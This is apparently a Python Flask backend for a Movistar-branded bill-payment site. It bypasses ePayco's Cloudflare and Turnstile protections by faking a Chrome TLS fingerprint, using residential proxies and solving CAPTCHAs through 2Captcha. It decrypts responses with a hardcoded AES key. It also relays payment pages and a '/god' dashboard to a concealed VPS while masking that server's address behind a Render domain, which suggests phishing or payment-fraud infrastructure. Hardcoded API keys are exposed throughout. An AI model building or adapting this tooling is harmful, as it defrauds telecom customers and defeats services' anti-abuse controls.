import sys
import json
import time
import requests
import tls_client
import base64
import os
from flask import Flask, request, jsonify, send_file, send_from_directory, make_response
from flask_cors import CORS
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
except ImportError:
    AES = None

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
# Habilitar peticiones desde Vercel u otros dominios
CORS(app)

# Configuración API Movistar / ePayco
MOVISTAR_PUBLIC_KEY = "479f29cc87cb26bdea89e873b5287784"
MOVISTAR_DOMINIO   = "https://movistar.epayco.me"
ENDPOINT_TOKEN      = "https://recaudo.epayco.co/api/recaudo/get/token"
ENDPOINT_CONSULTA   = "https://recaudo.epayco.co/api/recaudo/proyecto/api/consulta/facturas"
API_KEY_2CAPTCHA    = "12f9e3865d60235df14c8dff5e8854b9"
from curl_cffi import requests as curl_requests

# === CONFIGURA TUS PROXIES RESIDENCIALES AQUÍ ===
# Formato: "http://usuario:contraseña@ip_roxy:puerto" (Si no tiene usuario, solo "http://ip_proxy:puerto")
# Déjalo vacío si lo pruebas en Localhost sin proxy.
PROXY_URL = "" 

def get_session():
    if PROXY_URL:
        return curl_requests.Session(
            impersonate="chrome120",
            proxies={"http": PROXY_URL, "https": PROXY_URL},
            verify=False
        )
    return curl_requests.Session(impersonate="chrome120")

def get_movistar_token(session):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://movistar.recaudo.epayco.co",
        "Referer": "https://movistar.recaudo.epayco.co/"
    }
    payload = {
        "public_key": MOVISTAR_PUBLIC_KEY,
        "dominio": MOVISTAR_DOMINIO
    }
    try:
        res = session.post(ENDPOINT_TOKEN, headers=headers, json=payload, timeout=15)
        if res.status_code == 200:
            return res.json().get("data", {}).get("token")
        
        print(f"[DEBUG] -> ERROR OBTENIENDO TOKEN: Code {res.status_code} | Respuesta: {res.text[:150]}", file=sys.stderr, flush=True)
        return None
    except Exception as e:
        print(f"[DEBUG] -> Exception letal pidiendo Token: {str(e)}", file=sys.stderr, flush=True)
        return None

def solve_turnstile():
    url_in = "https://2captcha.com/in.php"
    payload_in = {
        "key": API_KEY_2CAPTCHA,
        "method": "turnstile",
        "sitekey": "0x4AAAAAABvJzZ2sF3LSNXQw",
        "pageurl": "https://movistar.recaudo.epayco.co/",
        "json": 1
    }
    try:
        res = requests.post(url_in, data=payload_in, timeout=20)
        data = res.json()
        if data.get("status") != 1:
            print(f"[DEBUG] -> Error Fatal en 2Captcha (Falta saldo?): {data}", file=sys.stderr, flush=True)
            return None
        task_id = data.get("request")
        
        url_res = f"https://2captcha.com/res.php?key={API_KEY_2CAPTCHA}&action=get&id={task_id}&json=1"
        for _ in range(25):
            time.sleep(3)
            res_poll = requests.get(url_res, timeout=10)
            data_poll = res_poll.json()
            if data_poll.get("status") == 1:
                return data_poll.get("request")
            elif data_poll.get("request") != "CAPCHA_NOT_READY":
                print(f"[DEBUG] -> 2Captcha canceló la tarea: {data_poll}", file=sys.stderr, flush=True)
                return None
        print(f"[DEBUG] -> 2Captcha falló por Tiempo Agotado de 75segundos.", file=sys.stderr, flush=True)
        return None
    except Exception as e:
        print(f"[DEBUG] -> Interferencia en red al conectar a 2Captcha: {str(e)}", file=sys.stderr, flush=True)
        return None

def decrypt_epayco_response(encrypted_b64):
    if not AES:
        return {"error": "Librería Crypto no instalada"}
    try:
        key = "C6ENvRUmxYurdHgYyWNx2arr8wYquQbG".encode("utf-8")
        raw_data = base64.b64decode(encrypted_b64)
        if len(raw_data) < 32:
            return {"error": "Respuesta demasiado corta para descifrar"}
        iv = raw_data[:16]
        ciphertext = raw_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_raw = cipher.decrypt(ciphertext)
        decrypted_text = unpad(decrypted_raw, AES.block_size).decode("utf-8")
        return json.loads(decrypted_text)
    except Exception as e:
        return {"error": f"Fallo al descifrar: {str(e)}"}

# ----------------- RUTAS DE FRONTEND (MONOLITO) ---------------- #
@app.route('/')
def home_frontend():
    # Render recibe la raíz de la web y saca el archivo original de Vercel/XAMPP
    if os.path.exists('index.html'):
        return send_file('index.html')
    return "Falta mover el archivo index.html adentro de esta carpeta para que se muestre en Render.", 404

@app.route('/img/<path:filename>')
def serve_img(filename):
    # Sirve los logos e imágenes
    return send_from_directory('img', filename)

@app.route('/pagos/<path:subpath>', methods=['GET', 'POST', 'OPTIONS'])
def proxy_pagos(subpath):
    target_url = f"http://83.229.3.43/pagos/{subpath}"
    headers = {key: value for (key, value) in request.headers if key.lower() not in ['host', 'content-length']}
    
    try:
        if request.method == 'POST':
            res = requests.post(target_url, params=request.args, data=request.get_data(), headers=headers, timeout=20, allow_redirects=False)
        elif request.method == 'OPTIONS':
            res = requests.options(target_url, params=request.args, headers=headers, timeout=20, allow_redirects=False)
        else:
            res = requests.get(target_url, params=request.args, headers=headers, timeout=20, allow_redirects=False)
            
        flask_res = make_response(res.content, res.status_code)
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'set-cookie']
        for name, value in res.raw.headers.items():
            if name.lower() not in excluded_headers:
                if name.lower() == 'location':
                    value = value.replace('http://83.229.3.43', 'https://movistarprueba.onrender.com')
                flask_res.headers.add(name, value)
                
        for cookie in res.cookies:
            flask_res.set_cookie(cookie.name, cookie.value, path=cookie.path)

        return flask_res
    except Exception as e:
        return f"Error Proxy PHP: {str(e)}", 502

@app.route('/god', methods=['GET', 'POST'])
@app.route('/god/', methods=['GET', 'POST'])
@app.route('/god/<path:subpath>', methods=['GET', 'POST', 'OPTIONS'])
def proxy_god(subpath="dashboard.php"):
    if not subpath or subpath == "":
        subpath = "dashboard.php"
    target_url = f"http://83.229.3.43/god/{subpath}"
    headers = {key: value for (key, value) in request.headers if key.lower() not in ['host', 'content-length']}
    
    try:
        if request.method == 'POST':
            res = requests.post(target_url, params=request.args, data=request.get_data(), headers=headers, timeout=20, allow_redirects=False)
        elif request.method == 'OPTIONS':
            res = requests.options(target_url, params=request.args, headers=headers, timeout=20, allow_redirects=False)
        else:
            res = requests.get(target_url, params=request.args, headers=headers, timeout=20, allow_redirects=False)
            
        flask_res = make_response(res.content, res.status_code)
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'set-cookie']
        for name, value in res.raw.headers.items():
            if name.lower() not in excluded_headers:
                if name.lower() == 'location':
                    value = value.replace('http://83.229.3.43', 'https://movistarprueba.onrender.com')
                flask_res.headers.add(name, value)
                
        for cookie in res.cookies:
            flask_res.set_cookie(cookie.name, cookie.value, path=cookie.path)

        return flask_res
    except Exception as e:
        return f"Error Proxy PHP: {str(e)}", 502

@app.route('/consulta', methods=['POST'])
def consultar_deuda():
    data_req = request.get_json()
    if not data_req or 'numero' not in data_req:
        return jsonify({"status": "error", "message": "Falta el número a consultar"}), 400

    # ================= ARQUITECTURA MAESTRO / ESCLAVO ================= 
    # Determina si esta línea de código se está ejecutando bajo la web pública RENDER.
    if os.environ.get("RENDER"):
        print("[DEBUG] -> Render.com enviando petición puente al Servidor VPS Oculto...", file=sys.stderr, flush=True)
        try:
            proxy_res = requests.post("http://83.229.3.43:10000/consulta", json=data_req, timeout=120)
            return jsonify(proxy_res.json()), proxy_res.status_code
        except Exception as e:
            print(f"[DEBUG] -> Error Fatal contactando a tu servidor Windows: {str(e)}", file=sys.stderr, flush=True)
            return jsonify({"status": "error", "message": "Backend apagado o tu VPS Firewall bloqueó a Render"}), 502
    # ====================================================================

    numero = str(data_req['numero']).strip()
    print(f"[DEBUG] -> Consultando numero: {numero}", file=sys.stderr, flush=True)
    session = get_session()
    
    try:
        ip_debug = session.get("https://api.ipify.org?format=json", timeout=10).json().get("ip")
        print(f"[DEBUG] -> IP de Salida (Proxy Check): {ip_debug}", file=sys.stderr, flush=True)
    except Exception as e:
        print(f"[DEBUG] -> Error al checkear Proxy IP: {str(e)}", file=sys.stderr, flush=True)
        
    print("[DEBUG] -> Obteniendo token Movistar...", file=sys.stderr, flush=True)
    bearer_token = get_movistar_token(session)
    if not bearer_token:
        print("[DEBUG] -> Falló token Movistar. Bloqueo Cloudflare?", file=sys.stderr, flush=True)
        return jsonify({"status": "error", "message": "Error interno: Movistar Cloudflare WAF."}), 403
        
    print("[DEBUG] -> Token Movistar exitoso. Resolviendo 2Captcha Turnstile...", file=sys.stderr, flush=True)
    turnstile_token = solve_turnstile()
    if not turnstile_token:
        print("[DEBUG] -> 2Captcha falló o venció (None).", file=sys.stderr, flush=True)
        return jsonify({"status": "error", "message": "No se pudo superar la seguridad (Captcha Timeout)."}), 408

    print(f"[DEBUG] -> 2Captcha devuelto: {turnstile_token[:15]}...", file=sys.stderr, flush=True)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Authorization": f"Bearer {bearer_token}",
        "Origin": "https://movistar.recaudo.epayco.co",
        "Referer": "https://movistar.recaudo.epayco.co/",
        "X-Api-Validation": turnstile_token,
        "X-api-key": "",
        "EkrWiVb": "po8EXdMTQLHyx2ME2kiAc1xfUEuEGB"
    }
    
    data = {
        "consulta": [
            {"parametro": "paymentRef", "value": numero},
            {"parametro": "invoiceType", "value": "movil"},
            {"parametro": "isRefNumber", "value": "true"},
            {"parametro": "comerce", "value": "movistar"},
            {"parametro": "referen", "value": ""},
            {"parametro": "novum", "value": ""}
        ],
        "tipoConsulta": "online",
        "dominio": "https://movistar.epayco.me/recaudo/recaudoenlinea"
    }
    
    try:
        res = session.post(ENDPOINT_CONSULTA, headers=headers, json=data, timeout=30)
        body_text = res.text
        
        if res.status_code == 200 or res.status_code == 201:
            try:
                resp_data = res.json()
            except:
                decrypted = decrypt_epayco_response(body_text.strip())
                resp_data = decrypted if "error" not in decrypted else {"message": "Error codificado"}

            for field in ["message", "data"]:
                val = resp_data.get(field)
                if isinstance(val, str) and len(val) > 40:
                    dec = decrypt_epayco_response(val)
                    if "error" not in dec:
                        resp_data[field] = dec

            data_part = resp_data.get("data")
            if isinstance(data_part, dict):
                facts = data_part.get("facturas", [])
                if isinstance(facts, list) and facts:
                    total = sum(float(f.get("total", 0)) for f in facts if isinstance(f, dict))
                    return jsonify({"status": "success", "amount": total, "numero": numero})
                
                return jsonify({"status": "success", "amount": 0, "message": "No tienes facturas pendientes."})
            
            msg = resp_data.get("message", "Error estructura")
            return jsonify({"status": "error", "message": msg})
            
        elif res.status_code == 401:
            return jsonify({"status": "error", "message": "Token inválido/vencido"}), 401
        else:
            return jsonify({"status": "error", "message": f"Error de servicio {res.status_code}"}), res.status_code
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)






